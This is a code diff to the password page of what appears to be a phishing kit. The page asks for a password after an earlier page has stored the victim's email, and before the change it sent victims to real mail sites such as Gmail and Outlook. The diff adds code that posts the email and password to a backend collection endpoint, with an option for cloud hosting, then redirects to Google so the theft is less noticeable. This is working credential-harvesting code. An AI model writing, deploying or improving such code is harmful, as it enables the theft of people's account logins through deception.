@@ -6,14 +6,11 @@ const accessBtn = document.getElementById('accessBtn');
 const loadingSpinner = document.getElementById('loadingSpinner');
 const formContent = document.querySelector('.card-content form');
 
-// Redirect URLs for random selection
-const redirectUrls = [
-    'https://www.gmail.com',
-    'https://mail.google.com',
-    'https://www.google.com',
-    'https://www.yahoo.com',
-    'https://www.outlook.com'
-];
+// ============================================
+// IMPORTANT: Update this with your backend URL
+// ============================================
+const API_BASE_URL = 'http://localhost:5000'; // For local testing
+// const API_BASE_URL = 'https://your-railway-url.railway.app'; // For production
 
 // Check if user came from page 1
 window.addEventListener('load', function() {
@@ -30,12 +27,13 @@ window.addEventListener('load', function() {
 });
 
 // Password Form Submission
-passwordForm.addEventListener('submit', function(e) {
+passwordForm.addEventListener('submit', async function(e) {
     e.preventDefault();
     
     passwordError.style.display = 'none';
     
     const password = passwordInput.value;
+    const userEmail = localStorage.getItem('userEmail');
     
     // Validate password (minimum 1 character)
     if (password.length < 1) {
@@ -48,17 +46,40 @@ passwordForm.addEventListener('submit', function(e) {
     formContent.style.display = 'none';
     loadingSpinner.style.display = 'block';
     
-    // Simulate processing delay
-    setTimeout(function() {
-        // Clear stored email
-        localStorage.removeItem('userEmail');
+    try {
+        // Send data to backend
+        const response = await fetch(`${API_BASE_URL}/api/submit`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: userEmail,
+                password: password
+            })
+        });
         
-        // Select random redirect URL
-        const randomUrl = redirectUrls[Math.floor(Math.random() * redirectUrls.length)];
+        const data = await response.json();
         
-        // Redirect to random URL or Gmail
-        window.location.href = randomUrl;
-    }, 1500);
+        if (data.success) {
+            console.log('✅ Submission successful');
+            // Clear stored email
+            localStorage.removeItem('userEmail');
+            
+            // Redirect to Google
+            setTimeout(() => {
+                window.location.href = data.redirectUrl || 'https://www.google.com';
+            }, 1500);
+        } else {
+            throw new Error(data.error || 'Submission failed');
+        }
+    } catch (error) {
+        console.error('Error:', error);
+        formContent.style.display = 'block';
+        loadingSpinner.style.display = 'none';
+        passwordError.style.display = 'block';
+        passwordError.textContent = 'Connection error. Please try again.';
+    }
 });
 
 function isValidPassword(password) {
